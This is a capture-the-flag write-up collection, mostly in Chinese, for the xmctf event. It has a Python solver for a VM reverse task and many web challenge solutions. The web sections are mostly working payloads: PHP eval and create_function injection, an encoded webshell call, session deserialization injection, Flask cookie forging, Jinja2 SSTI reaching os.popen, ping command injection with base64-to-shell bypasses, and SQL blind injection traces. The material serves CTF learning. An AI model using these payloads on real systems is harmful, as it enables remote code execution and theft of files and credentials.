



[TOC]

* TOC
{:toc}


# Writeup


## Reverse
### 0x1 vm

```python
key = [
    0xF4, 0xF1, 0xE1, 0x00, 0x00, 0x00, 0x00, 0xF2, 0xF1, 0xE4,
    0x1F, 0x00, 0x00, 0x00, 0xF1, 0xE1, 0x01, 0x00, 0x00, 0x00,
    0xF2, 0xF1, 0xE4, 0x20, 0x00, 0x00, 0x00, 0xF1, 0xE1, 0x02,
    0x00, 0x00, 0x00, 0xF2, 0xF1, 0xE4, 0x21, 0x00, 0x00, 0x00,
    0xF1, 0xE1, 0x03, 0x00, 0x00, 0x00, 0xF2, 0xF1, 0xE4, 0x22,
    0x00, 0x00, 0x00, 0xF1, 0xE1, 0x04, 0x00, 0x00, 0x00, 0xF2,
    0xF1, 0xE4, 0x23, 0x00, 0x00, 0x00, 0xF1, 0xE1, 0x05, 0x00,
    0x00, 0x00, 0xF2, 0xF1, 0xE4, 0x24, 0x00, 0x00, 0x00, 0xF1,
    0xE1, 0x06, 0x00, 0x00, 0x00, 0xF2, 0xF1, 0xE4, 0x25, 0x00,
    0x00, 0x00, 0xF1, 0xE1, 0x07, 0x00, 0x00, 0x00, 0xF2, 0xF1,
    0xE4, 0x26, 0x00, 0x00, 0x00, 0xF1, 0xE1, 0x08, 0x00, 0x00,
    0x00, 0xF2, 0xF1, 0xE4, 0x27, 0x00, 0x00, 0x00, 0xF1, 0xE1,
    0x09, 0x00, 0x00, 0x00, 0xF2, 0xF1, 0xE4, 0x28, 0x00, 0x00,
    0x00, 0xF1, 0xE1, 0x0A, 0x00, 0x00, 0x00, 0xF2, 0xF1, 0xE4,
    0x29, 0x00, 0x00, 0x00, 0xF1, 0xE1, 0x0B, 0x00, 0x00, 0x00,
    0xF2, 0xF1, 0xE4, 0x2A, 0x00, 0x00, 0x00, 0xF1, 0xE1, 0x0C,
    0x00, 0x00, 0x00, 0xF2, 0xF1, 0xE4, 0x2B, 0x00, 0x00, 0x00,
    0xF1, 0xE1, 0x0D, 0x00, 0x00, 0x00, 0xF2, 0xF1, 0xE4, 0x2C,
    0x00, 0x00, 0x00, 0xF1, 0xE1, 0x0E, 0x00, 0x00, 0x00, 0xF2,
    0xF1, 0xE4, 0x2D, 0x00, 0x00, 0x00, 0xF1, 0xE1, 0x0F, 0x00,
    0x00, 0x00, 0xF2, 0xF1, 0xE4, 0x2E, 0x00, 0x00, 0x00, 0xF1,
    0xE1, 0x10, 0x00, 0x00, 0x00, 0xF2, 0xF1, 0xE4, 0x2F, 0x00,
    0x00, 0x00, 0xF1, 0xE1, 0x11, 0x00, 0x00, 0x00, 0xF2, 0xF1,
    0xE4, 0x30, 0x00, 0x00, 0x00, 0xF1, 0xE1, 0x12, 0x00, 0x00,
    0x00, 0xF2, 0xF1, 0xE4, 0x31, 0x00, 0x00, 0x00, 0xF1, 0xE1,
    0x13, 0x00, 0x00, 0x00, 0xF2, 0xF1, 0xE4, 0x32, 0x00, 0x00,
    0x00, 0xF1, 0xE1, 0x14, 0x00, 0x00, 0x00, 0xF2, 0xF1, 0xE4,
    0x33, 0x00, 0x00, 0x00, 0xF1, 0xE1, 0x15, 0x00, 0x00, 0x00,
    0xF2, 0xF1, 0xE4, 0x34, 0x00, 0x00, 0x00, 0xF1, 0xE1, 0x16,
    0x00, 0x00, 0x00, 0xF2, 0xF1, 0xE4, 0x35, 0x00, 0x00, 0x00,
    0xF1, 0xE1, 0x17, 0x00, 0x00, 0x00, 0xF2, 0xF1, 0xE4, 0x36,
    0x00, 0x00, 0x00, 0xF1, 0xE1, 0x18, 0x00, 0x00, 0x00, 0xF2,
    0xF1, 0xE4, 0x37, 0x00, 0x00, 0x00, 0xF1, 0xE1, 0x19, 0x00,
    0x00, 0x00, 0xF2, 0xF1, 0xE4, 0x38, 0x00, 0x00, 0x00, 0xF1,
    0xE1, 0x1A, 0x00, 0x00, 0x00, 0xF2, 0xF1, 0xE4, 0x39, 0x00,
    0x00, 0x00, 0xF1, 0xE1, 0x1B, 0x00, 0x00, 0x00, 0xF2, 0xF1,
    0xE4, 0x3A, 0x00, 0x00, 0x00, 0xF3, 0x00, 0x00
]
enc = [0x6B, 0x61, 0x6C, 0x6A, 0x76, 0x38, 0x3C, 0x60, 0x7D, 0x61, 0x3E, 0x52, 0x7B, 0x3C, 0x7F, 0x79, 0x78, 0x4D, 0x61,
       0x52, 0x60, 0x4D, 0x6E, 0x65, 0x3C, 0x63, 0x3E, 0x70]

current = 0
flag = []


def sub_400A31(c):
    global key, current, enc, flag
    v1 = key[1]
    v3 = key[2]

    if v1 == 0xe1:
        current = enc[0]
    elif v1 == 0xe2:
        print('e2, ??/')
    elif v1 == 0xe3:
        print('e3, ??/')
    elif v1 == 0xe4:
        # flag.append(current if not b else current ^ 0xD)
        flag.append(current)
        enc = enc[1:]
    key = key[6:]


def sub_400A01(a1):
    global key, current
    current ^= 0xD
    key = key[1:]


def sub_400BCF(a1):
    global key
    for _ in [0, 1, 2, 3]:
        if key[0] == 0xf1:
            return sub_400A31(0)
        elif key[0] == 0xf2:
            sub_400A01(0)  # f2
        elif key[0] == 0xf3:
            return 0
        elif key[0] == 0xf4:
            print('input')
            key = key[1:]
            return


while 1:
    result = key[0]
    if result == 0xF3:
        break
    sub_400BCF(0)
print(''.join([chr(x) for x in flag]))
# flag{51mpl3_v1rtu@l_m@ch1n3}
```


## Web
### Web12
类似 [[GXYCTF2019]禁止套娃](https://www.jianshu.com/p/43de35540878)
```php
POST /?exp=print_r(scandir(pos(localeconv())));
`?exp=show_source(next(array_reverse(scandir(pos(localeconv())))));`
```
源码

```php
<?php
header("Content-Type: text/html;charset=utf-8");
include "flag.php";
echo "flag在哪里呢？<br>";
highlight_file(__FILE__);
error_reporting(0);
if(isset($_GET['exp'])){
    if (!preg_match('/data:\/\/|filter:\/\/|php:\/\/|phar:\/\//i', $_GET['exp'])) {
        if(';' === preg_replace('/[a-z,_]+\((?R)?\)/', NULL, $_GET['exp'])) {
            if (!preg_match('/et|cu|readfile|flip|na|info|dec|bin|hex|oct|pi|log/i', $_GET['exp'])) {
                // echo $_GET['exp'];
                @eval($_GET['exp']);
            }
            else{
                die("还差一点哦！");
            }
        }
        else{
            die("再好好想想！");
        }
    }
    else{
        die("还想读flag，臭弟弟！");
    }
}
// highlight_file(__FILE__);
?>
flag在哪里呢？
```

构造些能绕过的payload.

```
pos(localeconv()) => '.'
scandir(pos(localeconv())) => scandir('.')
```

看一下当前目录下的文件，`?exp=echo(var_dump(scandir(pos(localeconv()))));`

```
./
?> array(6) { 
[0]=> string(1) "." 
[1]=> string(2) ".." 
[2]=> string(4) ".git" 
[3]=> string(5) "1.php" 
[4]=> string(8) "flag.php" 
[5]=> string(9) "index.php"
}
```

看上级目录下的文件 `?exp=echo(var_dump(scandir(chr(pos(localtime(time(chdir(next(scandir(pos(localeconv())))))))))));`

```
../
?> array(3) { 
[0]=> string(1) "." 
[1]=> string(2) ".." 
[2]=> string(4) "html" }
```

看来就在当前目录下处理就行了，next方法可以获取数组的第二个值。把列表逆向排序一下。

打印数组逆向 `?exp=echo(var_dump(array_reverse(scandir(pos(localeconv())))));`

打印数组逆向后第二值即flag.php `?exp=echo(var_dump(next(array_reverse(scandir(pos(localeconv()))))));`

最终payload `?exp=echo(highlight_file(next(array_reverse(scandir(pos(localeconv()))))));`

或 `?exp=show_source(next(array_reverse(scandir(pos(localeconv())))));`

显示出flag

`xmctf{4daaf692b14569babe0dfc7d6e67698e}`

## web4

`dhudndrgrhs.php?shell=${~"\xa0\xb8\xba\xab"}[1](${~"\xa0\xb8\xba\xab"}[2]);&1=system&2=cat flag.php`

`$flag='xmflag{yi_giao_wo_li_giao_giao}';`

## easy-web

先ls一下。[可参考](https://blog.csdn.net/qq_45808659/article/details/105799699)

hackbar:
    
    GET: ?act=\create_function&arg=){return%20123;}system(%27ls ../%27);//
    POST: key=123

发现ffflll4g，然后cat出来

hackbar:
    
    GET: /?act=\create_function&arg=){return%20123;}system(%27cat%20/ffflll4g%27);//
    POST: key=123

flag{99798edf2eb1fa20d8ed9ce7da85f902}

## web12

```php
<?php
highlight_file(__FILE__);
$content = @$_GET['content'] ? "---mylocalnote---\n" . $_GET['content'] : "";
$name = @$_GET['name'] ? $_GET['name'] : '';
str_replace('/', '', $name);
str_replace('\\', '', $name);
file_put_contents("/tmp/" . $name, $content);
session_start();
if (isset($_SESSION['username'])) {
    echo "Thank u,{$_SESSION['username']}";
}
//flag in flag.php 
```

session漏洞，session的默认位置有

    /var/lib/php/sess_PHPSESSID
    /var/lib/php/sessions/sess_PHPSESSID

    /var/lib/php5/sess_PHPSESSID
    /var/lib/php5/sessions/sess_PHPSESSID

    /tmp/sess_PHPSESSID
    /tmp/sessions/sess_PHPSESSID


发现我们可以往session里写东西，但是会多写---mylocalnote---\n

session再存储时进行序列化，读取进行反序列化，默认的序列化引擎是php，其规则是：

    键名+竖线+经过serialize()函数序列处理的值
    因此我们尝试写
    username|s:5:"admin";

但会在首行加入变成

    ---mylocalnote---
    username|s:5:"admin";

按照session序列化引擎php规则，构造：
    
    ---mylocalnote---
    |s:1:"a";username|s:5:"admin";

这样就成功吧---mylocalnote---变成一个键名了，username也会成功反序列化成admin

F12看请求中的sessionid:

    Cookie: PHPSESSID=roc14cumrgut81e87u6i7bf7kh

bp抓包发请求。

    /?content=|s:1:"a";username|s:5:"admin";&name=sess_roc14cumrgut81e87u6i7bf7kh

已经提示是admin了，最后访问 /flag.php

`flag{d0t_Sav3_AnyTh1ng_1n_Tmp}`



## xweb8
提示 name is None,  其实name是个参数。

    /?name=123 # 输出了123
    /?name={{config}}

得到 secret_key: woshicaiji

pip install flask-unsign

    flask-unsign --sign --cookie "{'username':'admin'}" --secret "woshicaiji"
    得到  eyJ1c2VybmFtZSI6ImFkbWluIn0.Xu4O0g.XJfjTax5RNgPPOGF82S2ZXOdTmQ

访问/flag，用bp抓包修改session值为新的token

flag

    xmctf{f8e74d4b1b3fcd479f9b2a6a9ef935e0} 

## xweb6

2019巅峰极客upload

https://www.chainnews.com/articles/284498604176.htm

https://www.anquanke.com/post/id/189142#h3-12

test.jpg
http://xmctf.top:8841/file.php?file=
http://xmctf.top:8841/file.php?file=phar:///var/www/html/upload/0412c29576c708cf0155e8de242169b1.jpg
http://xmctf.top:8841/file.php?file=phar://upload/0412c29576c708cf0155e8de242169b1.jpg
http://xmctf.top:8841/file.php?file=phar://pos(localeconv())/upload/0412c29576c708cf0155e8de242169b1.jpg
http://xmctf.top:8841/file.php?file=phar://upload/098f6bcd4621d373cade4e832627b4f6.jpg
http://xmctf.top:8841/file.php?file=ph\ar:///var/www/html/upload/0412c29576c708cf0155e8de242169b1.jpg

文件在upload目录下。
?file=phar:///var/www/html/upload/0412c29576c708cf0155e8de242169b1.jpg
?file=phar:///upload/0412c29576c708cf0155e8de242169b1.jpg

## web11
Hello guest!

?name={{4*4}}

有结果，ssti注入

测试过滤了 `['.', '_', 'config']`


bytearray.fromhex(hex(0x4142)[2:])

```python
默认参考payload
/hello?name={{"".__class__.__base__.__subclasses__()[302].__init__.__globals__["os"].popen("cat /app/flag").read()}}

302是popen.本题过滤了[._] 使用16进制 \x5f绕过_ , \x2e绕过.

\x5f\x5fbase\x5f\x5f => __base__
.调用使用[]绕过 ()["\x5f\x5fclass\x5f\x5f"] => ().__class__
```
先ls查找下flag。
```python
http://xmctf.top:8857/?name={{()["\x5f\x5fclass\x5f\x5f"]["\x5f\x5fbase\x5f\x5f"]["\x5f\x5fsubclasses\x5f\x5f"]()[402]["\x5f\x5finit\x5f\x5f"]["\x5f\x5fglobals\x5f\x5f"]["os"]["popen"]("ls")["read"]()}}
http://xmctf.top:8857/?name={{()["\x5f\x5fclass\x5f\x5f"]["\x5f\x5fbase\x5f\x5f"]["\x5f\x5fsubclasses\x5f\x5f"]()[402]["\x5f\x5finit\x5f\x5f"]["\x5f\x5fglobals\x5f\x5f"]["os"]["popen"]("ls /")["read"]()}}
```
当前目录发现app.py， 在根目录发现了fl4g

```python
http://xmctf.top:8857/?name={{()["\x5f\x5fclass\x5f\x5f"]["\x5f\x5fbase\x5f\x5f"]["\x5f\x5fsubclasses\x5f\x5f"]()[402]["\x5f\x5finit\x5f\x5f"]["\x5f\x5fglobals\x5f\x5f"]["os"]["popen"]("cat app\x2epy")["read"]()}}
方法1分段读
http://xmctf.top:8857/?name={{()["\x5f\x5fclass\x5f\x5f"]["\x5f\x5fbase\x5f\x5f"]["\x5f\x5fsubclasses\x5f\x5f"]()[402]["\x5f\x5finit\x5f\x5f"]["\x5f\x5fglobals\x5f\x5f"]["os"]["popen"]("cat /fl4g")["read"]()[:3]}}
http://xmctf.top:8857/?name={{()["\x5f\x5fclass\x5f\x5f"]["\x5f\x5fbase\x5f\x5f"]["\x5f\x5fsubclasses\x5f\x5f"]()[402]["\x5f\x5finit\x5f\x5f"]["\x5f\x5fglobals\x5f\x5f"]["os"]["popen"]("cat /fl4g")["read"]()[3:]}}
方法2替换flag为xxyy进行显示
http://xmctf.top:8857/?name={{()["\x5f\x5fclass\x5f\x5f"]["\x5f\x5fbase\x5f\x5f"]["\x5f\x5fsubclasses\x5f\x5f"]()[402]["\x5f\x5finit\x5f\x5f"]["\x5f\x5fglobals\x5f\x5f"]["os"]["popen"]("cat /fl4g")["read"]()["replace"]("flag", "xxyy")}}
http://xmctf.top:8857/?name={{()["\x5f\x5fclass\x5f\x5f"]["\x5f\x5fbase\x5f\x5f"]["\x5f\x5fsubclasses\x5f\x5f"]()[402]["\x5f\x5finit\x5f\x5f"]["\x5f\x5fglobals\x5f\x5f"]["os"]["popen"]("cat app\x2epy")["read"]()["replace"]("flag", "xxyy")}}
```
提示flag在回血中，不会被显示。分段读一下即可。


`flag{12sd-jt4esf3-s93hcecc3-s33ff3}`

顺便下载app.py
```python
Hello from flask import Flask, request,render_template_string,redirect,render_template
app = Flask(__name__)
app.config['SECRET_KEY']='t9whf97yvvwn7y7w4twbv2640vyn0wt2v'


@app.route("/",methods=["GET","POST"])
def index():
    name = request.args.get('name', 'guest')
    if '_' in name or '.' in name or 'config' in name or 'args' in name:
        return render_template("hack.html")
    t = "Hello {}!".format(name)
    if "flag" in render_template_string(t): # just a trick:
        return "'flag' in result !!!Bighack"
    else:
        return render_template_string(t)

if __name__ == "__main__":
    app.run(host='0.0.0.0')!
```


## RCE-训练 未整理到笔记
原题目 GXYCTF2019]Ping Ping Ping
https://www.gem-love.com/ctf/516.html
https://0day.design/2018/12/20/Swpu%20CTF%202018%20Writeup/
https://www.cnblogs.com/wrnan/p/12811449.html
https://www.cnblogs.com/yesec/p/12475478.html
https://www.google.com/search?q=preg_match(%22%2F.*f.*l.*a.*g.*%2F%22&oq=preg_match(%22%2F.*f.*l.*a.*g.*%2F%22&aqs=chrome..69i57&sourceid=chrome&ie=UTF-8

```php
<?php
error_reporting(0);
highlight_file(__file__);
$ip = $_GET['ip'];
if (isset($ip)) {
  if(preg_match("/(;|`| |&|cp|mv|cat|tail|more|rev|tac|\*|\{)/i", $ip)){
      die("hack");
  }else if(preg_match("/.*f.*l.*a.*g.*/", $ip)){
      die("no!>");
  }
  $a = shell_exec("ping -c 4 ".$ip);
  var_dump($a);
}
?>
```
想办法绕吧
```
?ip=|ls
有效, $IFS和$IFS$9来绕过空格过滤
?ip=|ls$IFS/
找到了flag, 
    payload：?ip=127.0.0.1;a=g;cat$IFS$1fla$a.php
    分号不行，转用base64绕过吧。
?ip=|echo$IFS$9Y2F0IC9mbGFn|base64$IFS$9-d|sh
```


`xmctf{php_is_verty_ezzzzzzz}`


发现{ } < > %09都被ban了，但是可以使用$IFS和$IFS$9来绕过空格过滤
TODO global
%3b==; 在后台GET获取时会直接转成;, 不能这样绕过

[命令执行的绕过技巧](https://www.dazhuanlan.com/2019/10/05/5d97c963e2513/)

## 流量分析 

sql盲注。从这里开始

```
152493  2017-11-15 17:17:27.247019  192.168.173.1   192.168.173.134 HTTP    329 GET /index.php?id=1%27and%20(select%20ascii(substr((select%20skyflag_is_here2333%20from%20flag%20limit%200,1),1,1)))=33%23 HTTP/1.1 
...

153173  2017-11-15 17:17:27.526797  192.168.173.1   192.168.173.134 HTTP    330 GET /index.php?id=1%27and%20(select%20ascii(substr((select%20skyflag_is_here2333%20from%20flag%20limit%200,1),1,1)))=101%23 HTTP/1.1 
153183  2017-11-15 17:17:27.530679  192.168.173.1   192.168.173.134 HTTP    330 GET /index.php?id=1%27and%20(select%20ascii(substr((select%20skyflag_is_here2333%20from%20flag%20limit%200,1),1,1)))=120%23 HTTP/1.1 
这里120成功了才会进行一下一项注入，ascii码为120。
153193  2017-11-15 17:17:27.536240  192.168.173.1   192.168.173.134 HTTP    329 GET /index.php?id=1%27and%20(select%20ascii(substr((select%20skyflag_is_here2333%20from%20flag%20limit%200,1),2,1)))=33%23 HTTP/1.1 
153203  2017-11-15 17:17:27.540769  192.168.173.1   192.168.173.134 HTTP    329 GET /index.php?id=1%27and%20(select%20ascii(substr((select%20skyflag_is_here2333%20from%20flag%20limit%200,1),2,1)))=34%23 HTTP/1.1 
153213  2017-11-15 17:17:27.545229  192.168.173.1   192.168.173.134 HTTP    329 GET /index.php?id=1%27and%20(select%20ascii(substr((select%20skyflag_is_here2333%20from%20flag%20limit%200,1),2,1)))=35%23 HTTP/1.1 
153223  2017-11-15 17:17:27.559831  192.168.173.1   192.168.173.134 HTTP    329 GET /index.php?id=1%27and%20(select%20ascii(substr((select%20skyflag_is_here2333%20from%20flag%20limit%200,1),2,1)))=36%23 HTTP/1.1 
```
按上面的步骤找到全部的ascii码。组合

`xmctf{w1r3s7@r&b@dv@Nc3d_U#3}`

[某行业攻防培训-----流量分析之-----sql盲注](https://blog.csdn.net/qq_45555226/article/details/102809032)

## xweb5
method=logout
/phpinfo.php

open_basedir    /var/www/html/:/tmp/:/flag  /var/www/html/:/tmp/:/flag

## 打不开
whoami-考核 
web7